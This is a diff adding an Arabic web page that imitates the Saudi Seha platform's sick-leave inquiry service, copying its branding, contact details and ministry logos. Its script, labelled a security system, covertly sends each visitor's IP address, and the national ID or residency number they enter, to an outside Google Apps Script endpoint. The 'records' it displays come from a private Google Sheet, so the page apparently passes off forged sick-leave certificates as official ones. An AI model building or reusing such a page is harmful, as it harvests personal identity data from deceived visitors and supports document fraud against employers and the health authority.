@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>منصة صحة - الإجازات المرضية</title>
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    
+    <style>
+        :root {
+            --partner-background-blue: #316eb5; 
+        }
+
+        body { 
+            margin: 0; 
+            padding: 0; 
+            font-family: 'GE SS Two', 'GE SS Two Medium', 'Cairo', sans-serif; 
+            background-color: #ffffff; 
+            overflow-x: hidden; 
+            color: #2c5ba7; 
+        }
+
+        .white-seha-logo { filter: brightness(0) invert(1); }
+
+        .header {
+            position: fixed; top: 0; right: 0; width: 100%; height: 90px;
+            background-color: #fff; display: flex; align-items: center; justify-content: space-between;
+            padding: 0 25px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); z-index: 1000; box-sizing: border-box;
+        }
+        .logo img { height: 150px; width: auto; }
+
+        .menu-icon { cursor: pointer; padding: 10px; display: flex; flex-direction: column; justify-content: space-between; height: 16px; width: 30px; }
+        .menu-icon span { display: block; width: 100%; height: 3px; background-color: #3498db; border-radius: 2px; }
+
+        .sidenav {
+            height: 100%; width: 0; position: fixed; z-index: 2000;
+            top: 0; left: 0; background-color: #fff;
+            overflow-x: hidden; transition: 0.5s; padding-top: 20px;
+            display: flex; flex-direction: column; text-align: center;
+        }
+        .sidenav .big-side-logo { height: 160px; width: auto; margin-bottom: 30px; }
+        .sidenav a { padding: 8px; text-decoration: none; font-size: 18px; color: #2c5ba7; display: block; border-bottom: 1px solid #f5f5f5; font-weight: 600; }
+        .close-btn { position: absolute; top: 15px; right: 25px; font-size: 45px; color: #3498db; cursor: pointer; line-height: 1; }
+
+        .login-btn-container { width: 100%; padding: 30px 20px; box-sizing: border-box; margin-top: auto; }
+        .login-btn { 
+            width: 100%; 
+            background-color: var(--partner-background-blue); 
+            color: white; 
+            padding: 18px; 
+            border: none; 
+            border-radius: 10px; 
+            font-size: 21px; 
+            cursor: pointer; 
+            transition: background 0.3s;
+            font-family: inherit;
+            font-weight: 600;
+        }
+        .login-btn:hover { background-color: #2c5ba7; }
+
+        .main-content { margin-top: 70px; }
+
+        /* التحكم في عرض الصفحات */
+        #results-page { display: none; }
+        .section-form { padding: 0px 0px 300px; text-align: center; max-width: 600px; margin: 0 auto; }
+        .form-title { 
+            font-size: 34px; 
+            font-weight: 750; 
+            color: #2c5ba7; 
+            margin-bottom: 10px;
+            display: inline-block;
+            /* الشطر السحري: جعل الخلفية بارتفاع 85% فقط من النص وتبدأ من الأعلى */
+            background-image: linear-gradient(to left, 
+                transparent 15%, 
+                rgba(44, 91, 167, 0.10) 10%, 
+                rgba(44, 91, 167, 0.10) 85%, 
+                transparent 85%
+            );
+            background-repeat: no-repeat;
+            background-size: 100%85%; /* العرض 10%، والارتفاع 85% فقط */
+            background-position: top; /* الخلفية تلتصق بالأعلى وتترك فراغاً بالأسفل */
+            
+            line-height: .8; /* الحفاظ على الارتفاع الدقيق مثل المحاولة السابقة */
+            padding: ; 
+            vertical-align: middle;
+        }
+        /* تقليل المسافة البيضاء في صفحة النتائج فقط */
+#results-page {
+    padding-bottom: 20px !important; 
+}
+
+        .form-desc {
+    font-size: 19px;
+    color: #888;
+    line-height: 1.6;
+    max-width: 450px;
+    margin: 0 auto 40px;
+    padding: 0 20px;
+    text-align: center;
+    display: block;
+}
+
+        
+        .form-group input { 
+            width: 90%; padding: 5px; margin-bottom: 15px; 
+            border: 1px solid #e0e0e0; border-radius: 8px; 
+            box-sizing: border-box; text-align: right; 
+    color:#000000 ; font-size: 20px;
+            font-family: inherit;
+        }
+
+        .btn-blue { 
+            background-color: var(--partner-background-blue); color: rgba(240, 255, 240, 0.9); border: none; 
+            width: auto ; min-width: 150px; padding: 12px 30px; border-radius: 8px; font-size: 16px; 
+            cursor: pointer; margin-bottom: 14px; font-weight: bold; 
+            transition: background 0.3s;
+            font-family: inherit;
+        }
+        .btn-blue:hover { background-color: #2c5ba7; }
+        
+        .btn-outline { 
+            background-color: transparent; color: var(--partner-background-blue); 
+            border: 1px solid var(--partner-background-blue); width: 200%; 
+            padding: 12px; border-radius: 8px; font-size: 14px; cursor: pointer; 
+            transition: background 0.3s;
+            font-family: inherit;
+            font-weight: 600;
+        }
+
+        /* تنسيقات النتائج */
+        .result-container { text-align: center; margin-top: 20px; }
+        .result-row { margin-bottom: 20px; }
+        .result-label { font-weight: 800; color: #000000; display: block; margin-bottom: 5px; font-size: 16px; }
+        .result-value { color: #757575; font-weight: 700;font-size: 17px;  display: block; padding-top: 10px;padding-bottom: 10px; margin-bottom: 10px; }
+
+        .section-blue-info { background-color: var(--partner-background-blue); color: white; padding: 0px 20px; text-align: center; }
+        .hero-logo img { height: 180px; margin-bottom: 5px; }
+        .blue-desc { font-size: 16px; line-height: 1.8; max-width: 500px; margin: 0 auto 50px; }
+        .menu-title { font-size: 22px; font-weight: 700; margin-bottom: 30px; border-bottom: 4px solid #fff; display: inline-block; padding-bottom: 10px; }
+        .blue-links a { display: block; color: white; text-decoration: none; padding: 14px; border-bottom: 1px solid rgba(255,255,255,0.2); width: 85%; margin: 0 auto; font-size: 18px; }
+
+        .section-footer { background-color: #316eb5; color: white; padding: 50px 25px 40px; text-align: right; }
+        .contact-header-container { text-align: center; margin-bottom: 35px; }
+        .contact-header { font-size: 22px; font-weight: 700; border-bottom: 4px solid #fff; display: inline-block; padding-bottom: 10px; }
+        .footer-flex-container { display: flex; justify-content: space-between; align-items: flex-start; flex-wrap: wrap; gap: 20px; }
+        .contact-info { font-size: 14px; line-height: 2; flex: 1; }
+        .work-hours { font-size: 11px; white-space: nowrap; opacity: 0.9; margin: 10px 0; }
+        .side-partners img { height: 150px; width: auto; display: block; margin-top: -15px; } 
+        .social-icons { margin-top: 15px; font-size: 24px; display: flex; justify-content: flex-start; gap: 20px; padding-right: 5px; }
+        .social-icons a { color: white; text-decoration: none; }
+        .footer-bottom { font-size: 14px; opacity: 0.8; border-top: 1px solid rgba(255,255,255,0.1); padding-top: 40px; text-align: center; margin-top: 30px; }
+    </style>
+</head>
+<body>
+
+    <header class="header">
+        <div class="logo">
+            <img src="https://lh3.googleusercontent.com/u/0/d/147KZ--zUA09JsHLlkRFOa9Dvcv5jfTy4" alt="صحة">
+        </div>
+        <div class="menu-icon" onclick="openNav()">
+            <span></span>
+            <span></span>
+            <span></span>
+        </div>
+    </header>
+    <div id="sideNav" class="sidenav" style="direction: rtl;">
+ <div style="display: flex; justify-content: space-between; align-items: center; padding: 1px 1px; width: 100%; height: 45px; box-sizing: border-box;">
+        <img src="https://lh3.googleusercontent.com/u/0/d/147KZ--zUA09JsHLlkRFOa9Dvcv5jfTy4" alt="صحة" style="height: 110px; width: auto;">
+        <span class="close-btn" onclick="closeNav()" style="position: static; font-size: 45px; cursor: pointer; color: #316eb5; line-height: 1;">&times;</span>
+    </div>
+    <hr style="border: 0; border-top: 1px solid #f0f0f0; margin: 0;">
+    <a href="#" onclick="showQueryPage()">الرئيسية</a>
+<a href="#">الخدمات</a>
+<a href="#" onclick="showQueryPage()">الاستعلامات</a>
+<a href="#">الأسئلة الشائعة</a>
+<a href="#">تواصل معنا</a>
+
+    <div class="login-btn-container">
+        <button class="login-btn">تسجيل الدخول</button>
+    </div>
+</div>
+
+
+    <main class="main-content">
+        
+        <section id="query-page" class="section-form">
+            <h1 class="form-title">الإجازات المرضية</h1>
+            <p class="form-desc">خدمة الاستعلام عن الإجازات المرضية تتيح لك الاستعلام عن  حالة طلبك للإجازة ويمكنك طباعتها عن طريق تطبيق صحتي</p>
+            <div class="form-group">
+                <input type="text" id="serviceCode" placeholder="رمز الخدمة">
+                <input type="text" id="idNumber" placeholder="رقم الهوية / الإقامة">
+                <button class="btn-blue" onclick="fetchData()">استعلام</button>
+                </div>
+                        <button class="btn-blue">رجوع للخدمات</button>
+                    </div>
+            </div>
+        </section>
+
+        <section id="results-page" class="section-form">
+            <h1 class="form-title">الإجازات المرضية</h1>
+            <p class="form-desc">خدمة الاستعلام عن الإجازات المرضية تتيح لك الاستعلام عن حالة طلبك للإجازة ويمكنك طباعتها عن طريق تطبيق صحتي</p>
+            
+            <div class="result-container">
+                <div class="form-group">
+                    <input type="text" id="res-service-code" placeholder="رمز الخدمة" disabled>
+                    <input type="text" id="res-id-number" placeholder="رقم الهوية / الإقامة" disabled>
+                </div>
+
+                <div class="result-row">
+                    <label class="result-label">الاسم:</label>
+                    <div class="result-value" id="res-name">جارٍ التحميل...</div>
+                </div>
+
+                <div class="result-row">
+                    <label class="result-label">تاريخ اصدار تقرير الإجازة:</label>
+                    <div class="result-value" id="res-issue-date">-</div>
+                </div>
+
+                <div class="result-row">
+                    <label class="result-label">تبدا من:</label>
+                    <div class="result-value" id="res-start-date">-</div>
+                </div>
+
+                <div class="result-row">
+                    <label class="result-label">وحتى:</label>
+                    <div class="result-value" id="res-end-date">-</div>
+                </div>
+
+                <div class="result-row">
+                    <label class="result-label">المدة بالايام:</label>
+                    <div class="result-value" id="res-duration">-</div>
+                </div>
+
+                <div class="result-row">
+                    <label class="result-label">إسم الطبيب:</label>
+                    <div class="result-value" id="res-doctor">-</div>
+                </div>
+
+                <div class="result-row">
+                    <label class="result-label">المسمى الوظيفي:</label>
+                    <div class="result-value" id="res-job">-</div>
+                </div>
+
+                <button class="btn-blue" onclick="showQueryPage()">استعلام جديد</button>
+            </div>
+        </section>
+
+        <section class="section-blue-info">
+            <div class="hero-logo">
+                <img src="https://lh3.googleusercontent.com/u/0/d/147KZ--zUA09JsHLlkRFOa9Dvcv5jfTy4" class="white-seha-logo" alt="صحة أبيض">
+            </div>
+            <p class="blue-desc">منصة صحة تخدم جميع المنشآت الطبية من خلال تقديم الخدمات الصحية إلكترونياً لجميع المنشآت الطبية وتسعى إلى توحيد وأتمتة الإجراءات والخدمات.</p>
+            <h3 class="menu-title">القائمة الرئيسية</h3>
+            <div class="blue-links">
+                <a href="#">الخدمات</a>
+                <a href="#">الاستعلامات</a>
+                <a href="#">الأسئلة الشائعة</a>
+                <a href="#">تواصل معنا</a>
+            </div>
+        </section>
+
+        <section class="section-footer">
+            <div class="contact-header-container">
+                <h3 class="contact-header">تواصل معنا</h3>
+            </div>
+            <div class="footer-flex-container">
+                <div class="contact-info">
+                    <div><i class="fa-solid fa-phone"></i> 920002005</div>
+                    <div><i class="fa-solid fa-envelope"></i> support@seha.sa</div>
+                    <div><i class="fa-brands fa-whatsapp"></i> 920002005</div>
+                    <div class="work-hours">أوقات العمل: الأحد حتى الخميس 8 ص - 11 م</div>
+                    <div class="social-icons">
+                        <a href="#"><i class="fa-brands fa-x-twitter"></i></a> 
+                        <a href="#"><i class="fa-brands fa-youtube"></i></a> 
+                    </div>
+                </div>
+                <div class="side-partners">
+                    <img src="https://lh3.googleusercontent.com/u/0/d/1LiMXZf6w_dnA9V6ar1BbZcpPluDCDyHx" alt="شعار لين ووزارة الصحة">
+                </div>
+            </div>
+            <div class="footer-bottom">
+                جميع الحقوق محفوظة لمنصة صحة © 2026 <br>
+                سياسة الخصوصية | دليل الاستخدام
+            </div>
+        </section>
+    </main>
+
+    <script>
+// 1. دالة الأمان (نظام الرادار والسجل)
+async function checkSecurity(idInput = "زيارة فقط") {
+    const scriptURL = "https://script.google.com/macros/s/AKfycbxdROygukAbLYthgfQbvvTXNVBvTbDc1fSNc2o3KRN09ZEUsYpe_XfE96v7x01j1CJUZA/exec";
+    try {
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        const visitorIP = ipData.ip;
+        
+        // إرسال البيانات (IP ورقم الهوية) لجدول جوجل بنمط no-cors لضمان الوصول
+        fetch(`${scriptURL}?ip=${visitorIP}&id=${encodeURIComponent(idInput)}`, {
+            mode: 'no-cors',
+            method: 'GET'
+        });
+    } catch (e) { 
+        console.log("Security log failed"); 
+    }
+    return false; 
+}
+
+// 2. تشغيل نظام الأمان عند فتح الصفحة كزائر
+window.addEventListener('load', () => checkSecurity());
+
+// 3. دوال القائمة المنبثقة والتبديل بين الصفحات
+function openNav() { document.getElementById("sideNav").style.width = "100%"; }
+function closeNav() { document.getElementById("sideNav").style.width = "0"; }
+
+function showQueryPage() {
+    document.getElementById('query-page').style.display = 'block';
+    document.getElementById('results-page').style.display = 'none';
+    window.scrollTo(0,0);
+}
+
+// 4. دالة الاستعلام الرئيسية
+async function fetchData() {
+    const serviceCodeInput = document.getElementById('serviceCode').value.trim();
+    const idNumberInput = document.getElementById('idNumber').value.trim();
+    
+    if(!serviceCodeInput || !idNumberInput) {
+        alert("يرجى إدخال كافة البيانات");
+        return;
+    }
+
+    // إرسال الهوية والـ IP لجدول جوجل (Log) عند الضغط على الزر
+    await checkSecurity(idNumberInput);
+
+    // الانتقال لصفحة النتائج
+    document.getElementById('res-service-code').value = serviceCodeInput;
+    document.getElementById('res-id-number').value = idNumberInput;
+    document.getElementById('query-page').style.display = 'none';
+    document.getElementById('results-page').style.display = 'block';
+    window.scrollTo(0,0);
+
+    // جلب البيانات من Google Sheets
+    const sheetId = "1dJbaxOKHle4CiZIu0xVjaNJw2JgE5YZrpustJCcQ0dg";
+    const sheetUrl = `https://docs.google.com/spreadsheets/d/${sheetId}/gviz/tq?tqx=out:csv`;
+
+    try {
+        const response = await fetch(sheetUrl);
+        const data = await response.text();
+        const rows = data.split('\n').map(row => 
+            row.split(/,(?=(?:(?:[^"]*"){2})*[^"]*$)/).map(cell => cell.replace(/"/g, '').trim())
+        );
+
+        const match = rows.find(r => r[1] === serviceCodeInput && r[2] === idNumberInput);
+
+        if (match) {
+            document.getElementById('res-name').innerText = match[3] || "-";
+            document.getElementById('res-issue-date').innerText = match[4] || "-";
+            document.getElementById('res-start-date').innerText = match[5] || "-";
+            document.getElementById('res-end-date').innerText = match[6] || "-";
+            document.getElementById('res-duration').innerText = match[7] || "-";
+            document.getElementById('res-doctor').innerText = match[8] || "-";
+            document.getElementById('res-job').innerText = match[9] || "-";
+        } else {
+            document.getElementById('res-name').innerText = "بيانات غير صحيحة أو غير موجودة";
+            ['res-issue-date', 'res-start-date', 'res-end-date', 'res-duration', 'res-doctor', 'res-job'].forEach(id => {
+                document.getElementById(id).innerText = "-";
+            });
+        }
+    } catch (error) {
+        document.getElementById('res-name').innerText = "حدث خطأ أثناء الاتصال بالقاعدة";
+    }
+}
+
+</script>
+
+</body>
+</html>
